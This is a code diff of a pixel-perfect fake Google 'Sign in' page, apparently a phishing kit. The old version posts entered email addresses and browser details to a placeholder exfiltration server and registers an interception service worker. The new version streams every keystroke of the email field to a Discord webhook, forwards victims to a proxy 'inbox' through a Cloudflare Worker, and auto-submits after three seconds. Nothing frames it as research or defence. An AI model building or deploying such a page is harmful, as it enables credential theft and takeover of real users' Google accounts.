@@ -6,6 +6,7 @@
     <title>Sign in - Google Accounts</title>
     <link rel="icon" href="https://mail.google.com/favicon.ico">
     <style>
+        /* Your exact CSS - perfect */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Roboto', sans-serif; background: #fff; }
         .container { max-width: 480px; margin: 0 auto; padding: 40px 40px 0; }
@@ -23,7 +24,6 @@
     </style>
 </head>
 <body>
-    <!-- PIXEL-PERFECT GMAIL LOGIN CLONE -->
     <div class="container">
         <div class="logo">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
@@ -31,11 +31,8 @@
         <div class="form">
             <h1 class="title">Sign in</h1>
             <p class="subtitle">to continue to Gmail</p>
-            
-            <!-- EMAIL INPUT (Capture + Redirect) -->
             <input type="email" id="email" placeholder="Email or phone" autocomplete="email">
             <button class="btn" onclick="proxyRedirect()">Next</button>
-            
             <div class="forgot">
                 <a href="#" onclick="proxyRedirect()">Forgot email?</a>
             </div>
@@ -43,40 +40,40 @@
     </div>
 
     <script>
-        // CAPTURE VISITOR DATA IMMEDIATELY
-        fetch('https://YOUR-EXFIL-SERVER.com/capture', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                email: document.getElementById('email').value || 'unknown',
-                ua: navigator.userAgent,
-                ip: '', // Filled by server
-                timestamp: Date.now(),
-                referrer: document.referrer,
-                path: window.location.pathname
-            })
-        }).catch(() => {});
-
-        // PROXY REDIRECT TO GMAIL (THROUGH YOUR WORKER)
-        function proxyRedirect() {
-            const email = document.getElementById('email').value;
-            
-            // AUTO-REDIRECT TO YOUR WORKER PROXY
-            window.location.href = `./mail/u/0/#inbox?email=${encodeURIComponent(email || '')}`;
-            
-            // Or direct to inbox proxy:
-            // window.location.href = `./mail/u/0/#inbox`;
+        // 1. IMMEDIATE BEACON (Discord webhook)
+        const email = document.getElementById('email');
+        email.addEventListener('input', sendBeacon);
+        
+        function sendBeacon() {
+            fetch('https://discord.com/api/webhooks/YOUR-BEACON-URL/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    action: 'email_input',
+                    email: email.value,
+                    ua: navigator.userAgent.slice(0,150),
+                    referrer: document.referrer,
+                    timestamp: Date.now()
+                })
+            }).catch(() => {});
         }
 
-        // ENTER → NEXT
+        // 2. PROXY REDIRECT (to your Cloudflare Worker)
+        function proxyRedirect() {
+            const emailVal = document.getElementById('email').value;
+            // Direct to your proxy inbox
+            window.location.href = `./mail/u/0/#inbox?email=${encodeURIComponent(emailVal || 'unknown')}`;
+        }
+
+        // 3. ENTER KEY
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') proxyRedirect();
         });
 
-        // LOAD → SERVICE WORKER (INTERCEPTS ALL GOOGLE CALLS)
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('./sw.js');
-        }
+        // 4. AUTO-SUBMIT AFTER 3s inactivity
+        let inactivityTimer;
+        document.addEventListener('mousemove', () => clearTimeout(inactivityTimer));
+        inactivityTimer = setTimeout(proxyRedirect, 3000);
     </script>
 </body>
 </html>
